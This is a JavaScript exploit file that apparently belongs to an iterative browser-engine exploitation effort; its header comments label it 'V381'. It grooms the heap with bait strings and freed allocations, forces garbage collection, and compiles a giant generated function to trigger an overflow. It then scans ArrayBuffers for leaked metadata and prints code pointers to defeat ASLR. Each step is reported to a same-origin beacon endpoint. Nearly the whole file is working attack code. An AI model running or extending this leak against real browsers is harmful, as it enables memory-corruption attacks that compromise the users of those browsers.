// p381 - ArrayBuffer ASLR leak via MAIN THREAD allocation
//
// V379/V380: ALL Worker-allocated ABs had zero non-zero bytes.
// ROOT CAUSE: marge uses per-thread arenas. Worker ABs are in the Worker's
// arena. The MetadataTable compile runs on the main thread. The sweep goes
// forward through the MAIN THREAD'S arena only.
//
// FIX: Allocate target ArrayBuffers on the MAIN THREAD. They'll be in the
// same marge arena as the bait strings. After freeing baits and compiling,
// the sweep goes: MetaTable -> freed bait holes -> target ABs.
//
// No Worker needed. Everything on main thread.
//
// Beacon prefix: V381-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V381-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V381-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // Phase 1: Allocate 20 bait strings of 100KB each (main thread arena)
  var baits = [];
  for (var i = 0; i < 20; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-' + baits.length);

  // Phase 2: Allocate 14 target ArrayBuffers on MAIN THREAD (same arena!)
  var targets = [];
  var views = [];
  for (var i = 0; i < 14; i++) {
    var ab = new ArrayBuffer(100000);
    targets.push(ab);
    views.push(new Uint8Array(ab));
  }
  B('TARGETS-' + targets.length);

  // Phase 3: Free baits
  for (var i = 0; i < baits.length; i++) baits[i] = null;
  baits = null;

  // Phase 4: GC pressure to reclaim bait memory
  var gcR = 0;
  function gc() {
    for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
    for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
    gcR++;
    if (gcR < 30) setTimeout(gc, 30);
    else { B('GC-' + gcR); build(); }
  }
  gc();

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p381fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p381ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p381ok ? 'OK' : 'FAIL'));
      scan();
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  function scan() {
    B('SCANNING');

    var leakCount = 0;
    for (var i = 0; i < views.length; i++) {
      try {
        var v = views[i];
        var len = v.length;

        // Check for corrupted m_length
        if (len !== 100000) {
          B('T' + i + '-LEN-' + len);
        }

        // Count non-zero bytes in first 224 bytes
        var nonZero = 0;
        for (var j = 0; j < Math.min(len, 224); j++) {
          if (v[j] !== 0) nonZero++;
        }
        if (nonZero > 0) B('T' + i + '-nz' + nonZero);

        // Scan for 0xFF 0xFF 0xFF 0xFF signature
        var foundSig = false;
        var scanLen = Math.min(len, 100000);
        for (var j = 0; j < scanLen - 120; j++) {
          if (v[j] === 0xFF && v[j+1] === 0xFF && v[j+2] === 0xFF && v[j+3] === 0xFF) {
            foundSig = true;
            B('T' + i + '-SIG-' + j);

            // Read thunk at signature + 12 (8 bytes)
            var thunkHex = '';
            for (var k = j + 12; k < j + 20 && k < scanLen; k++) {
              thunkHex += hexByte(v[k]);
            }
            B('T' + i + '-THUNK-' + thunkHex);

            // Full pointer as lo/hi 32-bit halves
            var lo = v[j+12] | (v[j+13] << 8) | (v[j+14] << 16) | (v[j+15] << 24);
            var hi = v[j+16] | (v[j+17] << 8) | (v[j+18] << 16) | (v[j+19] << 24);
            B('T' + i + '-PTR-lo' + (lo >>> 0).toString(16) + '-hi' + (hi >>> 0).toString(16));

            // Verify: next entry at +112
            if (j + 112 + 20 < scanLen) {
              var match = (v[j+112] === 0xFF && v[j+113] === 0xFF &&
                           v[j+114] === 0xFF && v[j+115] === 0xFF);
              B('T' + i + '-NEXT-' + (match ? 'MATCH' : 'MISS'));
              if (match) {
                var t2 = '';
                for (var k = j + 112 + 12; k < j + 112 + 20; k++) t2 += hexByte(v[k]);
                B('T' + i + '-T2-' + t2);
              }
            }

            // bytecodeIndex at sig+56
            if (j + 56 + 4 <= scanLen) {
              var bci = v[j+56] | (v[j+57] << 8) | (v[j+58] << 16) | (v[j+59] << 24);
              B('T' + i + '-BCI-' + bci);
            }

            leakCount++;
            break;
          }
        }

        if (!foundSig) {
          B('T' + i + '-NOSIG-nz' + nonZero);
        }
      } catch(ex) {
        B('T' + i + '-CRASH-' + ex.message);
      }
    }

    B('LEAKS-' + leakCount);
    B('ALL-DONE');
  }
})();
